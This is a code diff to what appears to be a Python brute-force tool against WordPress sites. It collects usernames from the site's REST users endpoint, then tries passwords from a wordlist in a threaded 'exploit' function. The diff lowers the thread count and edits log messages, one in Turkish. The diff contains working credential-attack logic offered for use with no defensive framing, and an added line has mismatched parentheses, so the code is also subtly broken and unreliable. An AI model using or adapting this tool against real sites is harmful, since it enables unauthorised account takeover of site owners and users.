@@ -3,12 +3,12 @@ from termcolor import colored
 from concurrent.futures import ThreadPoolExecutor
 
 def fetching_user(url):
-	print(colored("[{}][*] Fetching user from {}".format(local_time(),url), "blue"))
+	print(colored("[{}][*] Site: {}".format(local_time(),url), "blue"))
 	user_list = []
 	try:
 		req = requests.get(url+"/wp-json/wp/v2/users/", allow_redirects=False, timeout=0.5).content.decode('utf-8')
 		try:
-			print(colored("[{}][!] Success Fetching user from {}".format(local_time(),url), "green"))
+			print
 			for x in json.loads(req):
 				user_list.append(x['slug'])
 		except ValueError:
@@ -44,7 +44,7 @@ def exploit(url, user_url, list_password):
 		else:
 			print
 	except requests.exceptions.ConnectionError as e:
-		print
+		print(colored("Parola yanlis."), "red"))
 	except Exception as e:
 			print
 
@@ -61,7 +61,7 @@ def brute_url(url):
 
 		password = "wl.txt"
 
-		with ThreadPoolExecutor(max_workers=40) as executor:
+		with ThreadPoolExecutor(max_workers=3) as executor:
 			for user_url in user:
 				with open(password, "r") as password_list:
 					for list_password in password_list:
